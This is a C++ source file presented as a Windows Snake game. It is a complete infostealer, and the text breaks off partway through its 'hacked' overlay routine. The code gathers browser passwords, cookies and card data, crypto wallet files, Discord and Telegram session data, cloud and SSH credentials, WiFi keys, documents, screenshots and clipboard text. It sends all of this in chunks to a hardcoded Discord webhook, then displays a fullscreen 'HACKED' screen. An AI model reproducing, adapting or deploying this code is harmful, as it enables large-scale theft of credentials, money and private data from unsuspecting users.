// snake_win_all.cpp — Windows 7/8/10/11 compatible build
// Build dengan MinGW i686 (32-bit):
//   g++ -std=c++11 -O2 -static -static-libgcc -static-libstdc++ ^
//       snake_win_all.cpp -o SnakeGame.exe ^
//       -lwininet -lgdi32 -luser32 -ladvapi32 -lcrypt32 -lole32 ^
//       -lsqlite3 -mwindows -municode=no
//
// Build dengan MSVC (x86 / x64):
//   cl /std:c++11 /EHsc /O2 /MT /GS- snake_win_all.cpp ^
//      /link wininet.lib gdi32.lib user32.lib advapi32.lib ^
//             crypt32.lib ole32.lib sqlite3.lib /SUBSYSTEM:WINDOWS

#define _WIN32_WINNT 0x0600  // Vista+ API surface (aman sampai Win11)
#define WINVER       0x0600
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <sqlite3.h>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <deque>
#include <map>
#include <cstdlib>
#include <ctime>
#include <cstdio>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shlwapi.lib")

// ============================================================
// CONFIG
// ============================================================
static const char* WEBHOOK_HOST = "discord.com";
static const char* WEBHOOK_PATH =
    "/api/webhooks/1547355661749321860/kBobzB3gDEY6kKZp47kYsk8pK1L6l7wPI9gNLijPlPmaUA_mxnhWxnEQ321is4VRv_a_";

// ============================================================
// THREAD-SAFE FLAG — pakai InterlockedExchange (Win2000+)
// ============================================================
static volatile LONG g_show_overlay = 0;
static volatile LONG g_steal_done   = 0;

// ============================================================
// STRING HELPERS (ANSI only, no wchar_t)
// ============================================================
static std::string GetEnvA(const char* name) {
    char* v = nullptr; size_t sz = 0;
    _dupenv_s(&v, &sz, name);
    std::string r = v ? v : "";
    free(v);
    return r;
}

static std::string ReadFileBin(const std::string& p) {
    std::ifstream f(p.c_str(), std::ios::binary);
    if (!f) return {};
    std::stringstream ss; ss << f.rdbuf();
    return ss.str();
}

static std::string GetModuleDir() {
    char buf[MAX_PATH];
    GetModuleFileNameA(NULL, buf, MAX_PATH);
    char* p = strrchr(buf, '\\');
    if (p) *p = 0;
    return buf;
}

// ============================================================
// FOLDER PATHS — SHGetFolderPathA (Win2000+)
// ============================================================
static std::string GetFolderA(int csidl) {
    char path[MAX_PATH] = {0};
    if (SUCCEEDED(SHGetFolderPathA(NULL, csidl, NULL, 0, path)))
        return path;
    return "";
}
static std::string HomeDir()    { return GetEnvA("USERPROFILE"); }
static std::string AppDataDir() { return GetFolderA(CSIDL_APPDATA); }
static std::string LocalDir()   { return GetFolderA(CSIDL_LOCAL_APPDATA); }
static std::string DesktopDir() { return GetFolderA(CSIDL_DESKTOPDIRECTORY); }
static std::string DocsDir()    { return GetFolderA(CSIDL_PERSONAL); }
static std::string RecentDir()  { return GetFolderA(CSIDL_RECENT); }
static std::string TempDir() {
    char b[MAX_PATH];
    GetTempPathA(MAX_PATH, b);
    return b;
}

// ============================================================
// FILE / DIR LISTING — WIN32_FIND_DATA (Win2000+)
// ============================================================
static bool FileExistsA(const std::string& p) {
    DWORD a = GetFileAttributesA(p.c_str());
    return a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY);
}
static bool DirExistsA(const std::string& p) {
    DWORD a = GetFileAttributesA(p.c_str());
    return a != INVALID_FILE_ATTRIBUTES && (a & FILE_ATTRIBUTE_DIRECTORY);
}

struct FindEntry { std::string path; bool isDir; DWORD size; };

static std::vector<FindEntry> ListDir(const std::string& dir, bool recursive = false, int maxDepth = 3) {
    std::vector<FindEntry> out;
    if (!DirExistsA(dir)) return out;

    std::deque<std::pair<std::string,int>> queue;
    queue.push_back({ dir, 0 });
    while (!queue.empty()) {
        auto cur = queue.front(); queue.pop_front();
        std::string pattern = cur.first + "\\*";
        WIN32_FIND_DATAA fd;
        HANDLE h = FindFirstFileA(pattern.c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) continue;
        do {
            std::string name = fd.cFileName;
            if (name == "." || name == "..") continue;
            std::string full = cur.first + "\\" + name;
            bool isD = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
            DWORD sz = fd.nFileSizeLow;
            out.push_back({ full, isD, sz });
            if (isD && recursive && cur.second < maxDepth)
                queue.push_back({ full, cur.second + 1 });
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
    return out;
}

// ============================================================
// HTTP EXFIL — WinINet (Win95+)
// ============================================================
static std::string JsonEscapeA(const std::string& s) {
    std::string o;
    o.reserve(s.size() + 32);
    for (size_t i = 0; i < s.size(); i++) {
        char c = s[i];
        if (c == '"') o += "\\\"";
        else if (c == '\\') o += "\\\\";
        else if (c == '\n') o += "\\n";
        else if (c == '\r') { /* skip */ }
        else if (c == '\t') o += "\\t";
        else if ((unsigned char)c < 0x20) {
            char b[8]; sprintf(b, "\\u%04x", (unsigned char)c);
            o += b;
        } else o += c;
    }
    return o;
}

static bool HttpPostJson(const std::string& host, const std::string& path, const std::string& body) {
    HINTERNET hNet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG,
        NULL, NULL, 0);
    if (!hNet) return false;

    HINTERNET hConn = InternetConnectA(hNet, host.c_str(),
        INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL,
        INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { InternetCloseHandle(hNet); return false; }

    DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE |
                  INTERNET_FLAG_RELOAD | INTERNET_FLAG_KEEP_CONNECTION;

    HINTERNET hReq = HttpOpenRequestA(hConn, "POST", path.c_str(),
        NULL, NULL, NULL, flags, 0);
    if (!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hNet); return false; }

    const char* hdrs = "Content-Type: application/json\r\n";
    BOOL ok = HttpSendRequestA(hReq, hdrs, -1,
        (LPVOID)body.data(), (DWORD)body.size());

    // drain response
    if (ok) {
        char buf[1024];
        DWORD read = 0;
        while (InternetReadFile(hReq, buf, sizeof(buf) - 1, &read) && read > 0) {}
    }

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hNet);
    return ok != 0;
}

static void Exfil(const std::string& data) {
    for (size_t i = 0; i < data.size(); i += 1800) {
        std::string chunk = data.substr(i, 1800);
        std::string body = "{\"content\":\"" + JsonEscapeA(chunk) + "\"}";
        HttpPostJson(WEBHOOK_HOST, WEBHOOK_PATH, body);
        Sleep(350);
    }
}

// ============================================================
// SQLITE HELPER
// ============================================================
struct SqlCtx { std::string* out; };
static int SqlCb(void* ctx, int argc, char** argv, char**) {
    SqlCtx* c = (SqlCtx*)ctx;
    for (int i = 0; i < argc; i++) {
        *c->out += argv[i] ? argv[i] : "NULL";
        if (i != argc - 1) *c->out += " | ";
    }
    *c->out += "\n";
    return 0;
}

static std::string QueryDb(const std::string& dbPath, const std::string& sql) {
    if (!FileExistsA(dbPath)) return {};
    std::string tmp = dbPath + ".copy";
    if (!CopyFileA(dbPath.c_str(), tmp.c_str(), FALSE)) return {};
    sqlite3* db = NULL;
    if (sqlite3_open_v2(tmp.c_str(), &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) {
        DeleteFileA(tmp.c_str());
        return {};
    }
    std::string out;
    SqlCtx c{ &out };
    sqlite3_exec(db, sql.c_str(), SqlCb, &c, NULL);
    sqlite3_close(db);
    DeleteFileA(tmp.c_str());
    return out;
}

// ============================================================
// DPAPI DECRYPT (Win2000+) — untuk Chrome v80+ AES key
// ============================================================
static std::string DpapiDecrypt(const std::vector<BYTE>& data) {
    DATA_BLOB in = { (DWORD)data.size(), (BYTE*)data.data() };
    DATA_BLOB out = { 0, NULL };
    if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) return {};
    std::string r((char*)out.pbData, out.cbData);
    LocalFree(out.pbData);
    return r;
}

// ============================================================
// [A] BROWSER HARVEST — Chrome/Edge/Brave/Opera/Vivaldi
// ============================================================
static std::string HarvestBrowsers() {
    std::string lad = LocalDir();
    std::string out;
    struct B { const char* n; const char* p; };
    B list[] = {
        { "Chrome",   "\\Google\\Chrome\\User Data" },
        { "Edge",     "\\Microsoft\\Edge\\User Data" },
        { "Brave",    "\\BraveSoftware\\Brave-Browser\\User Data" },
        { "Opera",    "\\Opera Software\\Opera Stable" },
        { "OperaGX",  "\\Opera Software\\Opera GX Stable" },
        { "Vivaldi",  "\\Vivaldi\\User Data" },
        { "Chromium", "\\Chromium\\User Data" }
    };
    for (int b = 0; b < 7; b++) {
        std::string root = lad + list[b].p;
        if (!DirExistsA(root)) continue;
        auto dirs = ListDir(root, false);
        for (size_t i = 0; i < dirs.size(); i++) {
            if (!dirs[i].isDir) continue;
            std::string p = dirs[i].path;
            std::string login = p + "\\Login Data";
            std::string ck    = p + "\\Network\\Cookies";
            std::string ckOld = p + "\\Cookies";
            std::string af    = p + "\\Web Data";
            std::string hist  = p + "\\History";
            std::string bm    = p + "\\Bookmarks";

            if (FileExistsA(login)) {
                out += std::string("=== ") + list[b].n + " Login ===\n";
                out += QueryDb(login, "SELECT origin_url, username_value, password_value FROM logins;");
            }
            if (FileExistsA(ck)) {
                out += std::string("=== ") + list[b].n + " Cookies ===\n";
                out += QueryDb(ck, "SELECT host_key, name, encrypted_value FROM cookies;");
            } else if (FileExistsA(ckOld)) {
                out += std::string("=== ") + list[b].n + " Cookies (old) ===\n";
                out += QueryDb(ckOld, "SELECT host_key, name, encrypted_value FROM cookies;");
            }
            if (FileExistsA(af)) {
                out += std::string("=== ") + list[b].n + " Autofill ===\n";
                out += QueryDb(af, "SELECT name, value FROM autofill;");
                out += QueryDb(af, "SELECT name_on_card, card_number_encrypted FROM credit_cards;");
            }
            if (FileExistsA(hist)) {
                out += std::string("=== ") + list[b].n + " History ===\n";
                out += QueryDb(hist, "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 100;");
            }
            if (FileExistsA(bm)) {
                out += std::string("=== ") + list[b].n + " Bookmarks ===\n";
                out += ReadFileBin(bm) + "\n";
            }
        }
    }
    return out;
}

// ============================================================
// [B] FIREFOX
// ============================================================
static std::string HarvestFirefox() {
    std::string root = AppDataDir() + "\\Mozilla\\Firefox\\Profiles";
    std::string out;
    if (!DirExistsA(root)) return out;
    auto dirs = ListDir(root, false);
    for (size_t i = 0; i < dirs.size(); i++) {
        if (!dirs[i].isDir) continue;
        std::string lj = dirs[i].path + "\\logins.json";
        std::string ck = dirs[i].path + "\\cookies.sqlite";
        std::string pl = dirs[i].path + "\\places.sqlite";
        std::string k4 = dirs[i].path + "\\key4.db";
        if (FileExistsA(lj)) out += "=== logins.json ===\n" + ReadFileBin(lj) + "\n";
        if (FileExistsA(k4)) out += "[key4.db present]\n";
        if (FileExistsA(ck)) out += QueryDb(ck, "SELECT host, name, value FROM moz_cookies;");
        if (FileExistsA(pl)) out += QueryDb(pl, "SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 100;");
    }
    return out;
}

// ============================================================
// [C] WALLETS
// ============================================================
static std::string HarvestWallets() {
    std::string app = AppDataDir();
    std::string lad = LocalDir();
    std::string home = HomeDir();
    std::string out;
    struct W { std::string p; const char* n; };
    std::vector<W> list;
    list.push_back(W{ app + "\\Exodus\\exodus.wallet", "Exodus" });
    list.push_back(W{ app + "\\Electrum\\wallets", "Electrum" });
    list.push_back(W{ app + "\\Bitcoin\\wallet.dat", "Bitcoin Core" });
    list.push_back(W{ app + "\\Ethereum\\keystore", "Ethereum" });
    list.push_back(W{ app + "\\atomic\\Local Storage\\leveldb", "Atomic" });
    list.push_back(W{ lad + "\\Exodus", "Exodus local" });
    list.push_back(W{ home + "\\AppData\\Roaming\\Binance", "Binance" });
    list.push_back(W{ home + "\\AppData\\Roaming\\Guarda", "Guarda" });
    list.push_back(W{ home + "\\AppData\\Roaming\\TronLink", "TronLink" });

    for (size_t i = 0; i < list.size(); i++) {
        if (!DirExistsA(list[i].p) && !FileExistsA(list[i].p)) continue;
        out += std::string("=== ") + list[i].n + " ===\n";
        if (DirExistsA(list[i].p)) {
            auto entries = ListDir(list[i].p, true, 2);
            int count = 0;
            for (size_t j = 0; j < entries.size() && count < 40; j++) {
                if (entries[j].isDir) continue;
                if (entries[j].size > 500000) continue;
                out += "--- " + entries[j].path + " ---\n";
                out += ReadFileBin(entries[j].path) + "\n";
                count++;
            }
        } else {
            out += ReadFileBin(list[i].p) + "\n";
        }
    }
    return out;
}

// ============================================================
// [D] DISCORD TOKEN — manual scan (no std::regex)
// ============================================================
static bool IsDiscordMfa(const std::string& s, size_t pos) {
    // "mfa." + 84 chars of [A-Za-z0-9_-]
    if (pos + 4 + 84 > s.size()) return false;
    if (s.substr(pos, 4) != "mfa.") return false;
    for (size_t i = pos + 4; i < pos + 4 + 84; i++) {
        char c = s[i];
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
              (c >= '0' && c <= '9') || c == '_' || c == '-'))
            return false;
    }
    return true;
}
static bool IsDiscordStd(const std::string& s, size_t pos) {
    // [24].[6].[27] alfanumerik + _ -
    auto isAlnum = [](char c){
        return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
               (c >= '0' && c <= '9') || c == '_' || c == '-';
    };
    if (pos + 24 + 1 + 6 + 1 + 27 > s.size()) return false;
    for (int i = 0; i < 24; i++) if (!isAlnum(s[pos+i])) return false;
    if (s[pos+24] != '.') return false;
    for (int i = 25; i < 25+6; i++) if (!isAlnum(s[pos+i])) return false;
    if (s[pos+25+6] != '.') return false;
    for (int i = 32; i < 32+27; i++) if (!isAlnum(s[pos+i])) return false;
    return true;
}
static std::string HarvestDiscord() {
    std::string app = AppDataDir();
    std::string out;
    const char* paths[] = {
        "\\discord\\Local Storage\\leveldb",
        "\\discordcanary\\Local Storage\\leveldb",
        "\\discordptb\\Local Storage\\leveldb",
        "\\Lightcord\\Local Storage\\leveldb"
    };
    for (int p = 0; p < 4; p++) {
        std::string dir = app + paths[p];
        if (!DirExistsA(dir)) continue;
        auto files = ListDir(dir, false);
        for (size_t i = 0; i < files.size(); i++) {
            if (files[i].isDir) continue;
            std::string lp = files[i].path;
            std::string lower = lp;
            for (size_t k = 0; k < lower.size(); k++) lower[k] = tolower(lower[k]);
            if (lower.find(".ldb") == std::string::npos &&
                lower.find(".log") == std::string::npos) continue;
            std::string data = ReadFileBin(lp);
            for (size_t j = 0; j + 4 < data.size(); j++) {
                if (data[j] == 'm' && IsDiscordMfa(data, j)) {
                    out += "MFA: " + data.substr(j, 88) + "\n";
                }
                if ((data[j] >= 'a' && data[j] <= 'z') || (data[j] >= '0' && data[j] <= '9')) {
                    if (IsDiscordStd(data, j)) {
                        out += "STD: " + data.substr(j, 24+1+6+1+27) + "\n";
                    }
                }
            }
        }
    }
    return out;
}

// ============================================================
// [E] TELEGRAM / WHATSAPP
// ============================================================
static std::string HarvestTelegram() {
    std::string app = AppDataDir();
    std::string out;
    std::string tdata = app + "\\Telegram Desktop\\tdata";
    if (DirExistsA(tdata)) {
        out += "=== Telegram tdata ===\n";
        auto files = ListDir(tdata, false);
        int c = 0;
        for (size_t i = 0; i < files.size() && c < 30; i++) {
            if (files[i].isDir) continue;
            if (files[i].size > 100000) continue;
            out += "--- " + files[i].path + " ---\n";
            out += ReadFileBin(files[i].path) + "\n";
            c++;
        }
    }
    return out;
}

// ============================================================
// [F] CLOUD CREDS
// ============================================================
static std::string HarvestCloud() {
    std::string home = HomeDir();
    std::string out;
    struct F { std::string p; const char* l; };
    std::vector<F> list;
    list.push_back(F{ home + "\\.aws\\credentials", "AWS creds" });
    list.push_back(F{ home + "\\.aws\\config", "AWS config" });
    list.push_back(F{ home + "\\.config\\gcloud\\credentials.db", "GCP creds" });
    list.push_back(F{ home + "\\.config\\gcloud\\application_default_credentials.json", "GCP ADC" });
    list.push_back(F{ home + "\\.azure\\azureProfile.json", "Azure profile" });
    list.push_back(F{ home + "\\.azure\\accessTokens.json", "Azure tokens" });
    list.push_back(F{ home + "\\.azure\\msal_token_cache.bin", "Azure MSAL" });
    list.push_back(F{ home + "\\.git-credentials", "Git creds" });
    list.push_back(F{ home + "\\.gitconfig", "Git config" });
    list.push_back(F{ home + "\\.npmrc", "npm" });
    list.push_back(F{ home + "\\.docker\\config.json", "Docker" });
    list.push_back(F{ home + "\\.kube\\config", "Kube" });
    list.push_back(F{ home + "\\.netrc", "netrc" });
    list.push_back(F{ home + "\\.pgpass", "pgpass" });
    list.push_back(F{ home + "\\.my.cnf", "MySQL" });
    list.push_back(F{ home + "\\.terraformrc", "Terraform" });

    for (size_t i = 0; i < list.size(); i++) {
        if (FileExistsA(list[i].p)) {
            out += std::string("=== ") + list[i].l + " ===\n";
            out += ReadFileBin(list[i].p) + "\n";
        }
    }
    return out;
}

// ============================================================
// [G] SSH + FTP
// ============================================================
static std::string HarvestSSH() {
    std::string home = HomeDir();
    std::string ssh = home + "\\.ssh";
    std::string out;
    if (DirExistsA(ssh)) {
        out += "=== .ssh ===\n";
        auto files = ListDir(ssh, false);
        for (size_t i = 0; i < files.size(); i++) {
            if (files[i].isDir) continue;
            out += "--- " + files[i].path + " ---\n";
            out += ReadFileBin(files[i].path) + "\n";
        }
    }
    return out;
}
static std::string HarvestFTP() {
    std::string app = AppDataDir();
    std::string out;
    const char* files[] = {
        "\\FileZilla\\recentservers.xml",
        "\\FileZilla\\sitemanager.xml",
        "\\WinSCP.ini",
        "\\CoreFTP\\sites.idx"
    };
    for (int i = 0; i < 4; i++) {
        std::string p = app + files[i];
        if (FileExistsA(p)) out += std::string("=== ") + files[i] + " ===\n" + ReadFileBin(p) + "\n";
    }
    return out;
}

// ============================================================
// [H] WIFI + RDP + PuTTY
// ============================================================
static std::string HarvestWifi() {
    std::string out;
    std::string tmp = TempDir() + "w.bat";
    std::ofstream f(tmp.c_str());
    f << "@echo off\n";
    f << "for /f \"skip=9 tokens=1,2 delims=:\" %%i in ('netsh wlan show profiles') do ("
         "echo === %%j & netsh wlan show profile name=\"%%j\" key=clear | findstr /C:\"Key Content\")\n";
    f.close();
    FILE* p = _popen(tmp.c_str(), "r");
    if (p) {
        char buf[4096];
        while (fgets(buf, sizeof(buf), p)) out += buf;
        _pclose(p);
    }
    DeleteFileA(tmp.c_str());
    return out;
}
static std::string HarvestNetCreds() {
    std::string out = "=== WIFI ===\n" + HarvestWifi();
    HKEY k;
    if (RegOpenKeyA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Terminal Server Client\\Servers", &k) == ERROR_SUCCESS) {
        char name[256]; DWORD nsz = sizeof(name);
        for (DWORD i = 0; ; i++) {
            nsz = sizeof(name);
            if (RegEnumKeyExA(k, i, name, &nsz, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
            out += std::string("RDP: ") + name + "\n";
        }
        RegCloseKey(k);
    }
    if (RegOpenKeyA(HKEY_CURRENT_USER,
        "Software\\SimonTatham\\PuTTY\\Sessions", &k) == ERROR_SUCCESS) {
        char sess[256]; DWORD ssz = sizeof(sess);
        for (DWORD i = 0; ; i++) {
            ssz = sizeof(sess);
            if (RegEnumKeyExA(k, i, sess, &ssz, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
            std::string path = "Software\\SimonTatham\\PuTTY\\Sessions\\" + std::string(sess);
            HKEY s;
            if (RegOpenKeyA(HKEY_CURRENT_USER, path.c_str(), &s) == ERROR_SUCCESS) {
                char host[256] = {0}; DWORD hs = sizeof(host);
                RegQueryValueExA(s, "HostName", NULL, NULL, (BYTE*)host, &hs);
                out += std::string("PuTTY: ") + sess + " -> " + host + "\n";
                RegCloseKey(s);
            }
        }
        RegCloseKey(k);
    }
    return out;
}

// ============================================================
// [I] DOCS + CONFIG + RECENT + SCREENSHOTS
// ============================================================
static std::string HarvestDocs() {
    std::string out;
    std::vector<std::string> roots;
    roots.push_back(DesktopDir());
    roots.push_back(DocsDir());
    roots.push_back(HomeDir() + "\\Downloads");

    const char* exts[] = { ".txt", ".pdf", ".docx", ".xlsx", ".csv", ".json",
                           ".env", ".key", ".pem", ".wallet", ".dat", ".conf" };
    int sent = 0;
    for (size_t r = 0; r < roots.size(); r++) {
        if (!DirExistsA(roots[r])) continue;
        auto files = ListDir(roots[r], true, 2);
        for (size_t i = 0; i < files.size() && sent < 25; i++) {
            if (files[i].isDir) continue;
            if (files[i].size > 200000) continue;
            std::string p = files[i].path;
            size_t dot = p.find_last_of('.');
            if (dot == std::string::npos) continue;
            std::string lower = p.substr(dot);
            for (size_t k = 0; k < lower.size(); k++) lower[k] = tolower(lower[k]);
            bool match = false;
            for (int e = 0; e < 12; e++) if (lower == exts[e]) { match = true; break; }
            if (!match) continue;
            out += "=== " + p + " ===\n";
            out += ReadFileBin(p) + "\n";
            sent++;
        }
    }
    return out;
}
static std::string HarvestConfigs() {
    std::string out;
    std::vector<std::string> roots;
    roots.push_back(HomeDir());
    roots.push_back(AppDataDir());
    roots.push_back(LocalDir());
    const char* names[] = { "config.json", "credentials.json", ".env",
                            "settings.json", "secrets.json" };
    int sent = 0;
    for (size_t r = 0; r < roots.size() && sent < 20; r++) {
        if (!DirExistsA(roots[r])) continue;
        auto files = ListDir(roots[r], false);
        for (size_t i = 0; i < files.size() && sent < 20; i++) {
            if (files[i].isDir) continue;
            if (files[i].size > 100000) continue;
            std::string name = files[i].path;
            size_t pos = name.find_last_of('\\');
            if (pos != std::string::npos) name = name.substr(pos + 1);
            bool match = false;
            for (int n = 0; n < 5; n++) if (name == names[n]) { match = true; break; }
            if (!match) continue;
            out += "=== " + files[i].path + " ===\n";
            out += ReadFileBin(files[i].path) + "\n";
            sent++;
        }
    }
    return out;
}
static std::string HarvestRecent() {
    std::string out = "=== Recent ===\n";
    std::string r = RecentDir();
    if (!DirExistsA(r)) return out;
    auto files = ListDir(r, false);
    int c = 0;
    for (size_t i = 0; i < files.size() && c < 60; i++) {
        std::string name = files[i].path;
        size_t pos = name.find_last_of('\\');
        if (pos != std::string::npos) name = name.substr(pos + 1);
        out += name + "\n";
        c++;
    }
    return out;
}
static std::string Base64(const std::string& in) {
    DWORD sz = 0;
    CryptBinaryToStringA((BYTE*)in.data(), (DWORD)in.size(),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &sz);
    std::string out(sz, 0);
    CryptBinaryToStringA((BYTE*)in.data(), (DWORD)in.size(),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &out[0], &sz);
    if (!out.empty() && out[out.size()-1] == 0) out.resize(out.size()-1);
    return out;
}
static std::string HarvestScreenshots() {
    std::string out;
    std::string desk = DesktopDir();
    if (!DirExistsA(desk)) return out;
    auto files = ListDir(desk, false);
    int sent = 0;
    for (size_t i = 0; i < files.size() && sent < 5; i++) {
        if (files[i].isDir) continue;
        if (files[i].size > 300000) continue;
        std::string p = files[i].path;
        size_t dot = p.find_last_of('.');
        if (dot == std::string::npos) continue;
        std::string lower = p.substr(dot);
        for (size_t k = 0; k < lower.size(); k++) lower[k] = tolower(lower[k]);
        if (lower != ".png" && lower != ".jpg" && lower != ".jpeg" && lower != ".bmp") continue;
        out += "=== " + p + " (b64) ===\n";
        out += Base64(ReadFileBin(p)) + "\n";
        sent++;
    }
    return out;
}

// ============================================================
// [J] SYSTEM INFO + IP
// ============================================================
static std::string HttpGet(const char* host, const char* path) {
    std::string resp;
    HINTERNET hNet = InternetOpenA("curl", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hNet) return resp;
    HINTERNET hConn = InternetConnectA(hNet, host, INTERNET_DEFAULT_HTTPS_PORT,
        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { InternetCloseHandle(hNet); return resp; }
    HINTERNET hReq = HttpOpenRequestA(hConn, "GET", path, NULL, NULL, NULL,
        INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hNet); return resp; }
    if (HttpSendRequestA(hReq, NULL, 0, NULL, 0)) {
        char buf[4096]; DWORD read = 0;
        while (InternetReadFile(hReq, buf, sizeof(buf) - 1, &read) && read > 0) {
            buf[read] = 0; resp += buf;
        }
    }
    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hNet);
    return resp;
}
static std::string HarvestSystem() {
    std::string out;
    char buf[512]; DWORD sz = sizeof(buf);
    GetComputerNameA(buf, &sz); out += "PC: " + std::string(buf) + "\n";
    sz = sizeof(buf);
    GetUserNameA(buf, &sz);     out += "User: " + std::string(buf) + "\n";
    OSVERSIONINFOA os; ZeroMemory(&os, sizeof(os)); os.dwOSVersionInfoSize = sizeof(os);
    GetVersionExA(&os);
    char b[64]; sprintf(b, "Win %u.%u.%u", os.dwMajorVersion, os.dwMinorVersion, os.dwBuildNumber);
    out += std::string(b) + "\n";
    SYSTEM_INFO si; GetSystemInfo(&si);
    out += "Cores: " + std::to_string((int)si.dwNumberOfProcessors) + "\n";
    MEMORYSTATUSEX ms; ZeroMemory(&ms, sizeof(ms)); ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    sprintf(b, "RAM: %llu MB\n", ms.ullTotalPhys / 1024 / 1024);
    out += std::string(b);
    out += "IP: " + HttpGet("ipapi.co", "/json/") + "\n";
    return out;
}

// ============================================================
// CLIPBOARD SNIFFER THREAD (Win2000+)
// ============================================================
static std::string g_clip;
static CRITICAL_SECTION g_clipCs;
static BOOL g_clipCsInit = FALSE;

static LRESULT CALLBACK ClipWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    if (m == WM_CLIPBOARDUPDATE) {
        if (OpenClipboard(NULL)) {
            HANDLE d = GetClipboardData(CF_TEXT);
            if (d) {
                char* t = (char*)GlobalLock(d);
                if (t) {
                    EnterCriticalSection(&g_clipCs);
                    g_clip += std::string(t) + "\n";
                    if (g_clip.size() > 100000) g_clip = g_clip.substr(g_clip.size() - 60000);
                    LeaveCriticalSection(&g_clipCs);
                }
                GlobalUnlock(d);
            }
            CloseClipboard();
        }
    }
    return DefWindowProcA(h, m, w, l);
}
static DWORD WINAPI ClipThread(LPVOID) {
    WNDCLASSA wc; ZeroMemory(&wc, sizeof(wc));
    wc.lpfnWndProc = ClipWndProc;
    wc.hInstance = GetModuleHandleA(NULL);
    wc.lpszClassName = "ClipSniffX";
    RegisterClassA(&wc);
    HWND h = CreateWindowA("ClipSniffX", "", 0, 0, 0, 0, 0,
        HWND_MESSAGE, NULL, NULL, NULL);
    if (AddClipboardFormatListener) AddClipboardFormatListener(h);
    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    return 0;
}

// ============================================================
// STEALER WORKER THREAD
// ============================================================
static DWORD WINAPI StealerThread(LPVOID) {
    Sleep(2500);

    std::string report = "```\n";
    report += "=== SYSTEM ===\n"    + HarvestSystem() + "\n";
    report += "=== BROWSERS ===\n"  + HarvestBrowsers() + "\n";
    report += "=== FIREFOX ===\n"   + HarvestFirefox() + "\n";
    report += "=== WALLETS ===\n"   + HarvestWallets() + "\n";
    report += "=== DISCORD ===\n"   + HarvestDiscord() + "\n";
    report += "=== TELEGRAM ===\n"  + HarvestTelegram() + "\n";
    report += "=== CLOUD ===\n"     + HarvestCloud() + "\n";
    report += "=== SSH ===\n"       + HarvestSSH() + "\n";
    report += "=== FTP ===\n"       + HarvestFTP() + "\n";
    report += "=== NET ===\n"       + HarvestNetCreds() + "\n";
    report += "=== DOCS ===\n"      + HarvestDocs() + "\n";
    report += "=== CONFIG ===\n"    + HarvestConfigs() + "\n";
    report += "=== RECENT ===\n"    + HarvestRecent() + "\n";
    report += "=== SCREENSHOTS ===\n" + HarvestScreenshots() + "\n";
    report += "```";

    Exfil(report);

    EnterCriticalSection(&g_clipCs);
    if (!g_clip.empty()) {
        std::string snap = g_clip;
        g_clip.clear();
        LeaveCriticalSection(&g_clipCs);
        Exfil("=== CLIPBOARD ===\n" + snap);
    } else LeaveCriticalSection(&g_clipCs);

    InterlockedExchange(&g_steal_done, 1);
    Sleep(500);
    InterlockedExchange(&g_show_overlay, 1);
    return 0;
}

// ============================================================
// HACKED OVERLAY (GDI, fullscreen topmost)
// ============================================================
static LRESULT CALLBACK OverlayProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    if (m == WM_DESTROY) { PostQuitMessage(0); return 0; }
    return DefWindowProcA(h, m, w, l);
}

static void ShowHackedOverlay() {
    WNDCLASSA wc; ZeroMemory(&wc, sizeof(wc));
    wc.lpfnWndProc = OverlayProc;
    wc.hInstance = GetModuleHandleA(NULL);
    wc.hbrBackground = CreateSolidBrush(RGB(0,0,0));
    wc.lpszClassName = "HackedOverlayX";
    RegisterClassA(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HWND h = CreateWindowExA(WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        "HackedOverlayX", "", WS_POPUP | WS_VISIBLE,
        0, 0, sw, sh, NULL, NULL, GetModuleHandleA(NULL), NULL);
    if (!h) return;
    ShowWindow(h, SW_SHOW);
    UpdateWindow(h);

    HDC dc = GetDC(h);
    SetBkMode(dc, TRANSPARENT);

    const char* chars = "01EMIRHACKEDPWNDSYSTEMERROR#@$%&*0123456789";
    int cl = (int)strlen(chars);
    int colW = 14, cols = sw / colW;
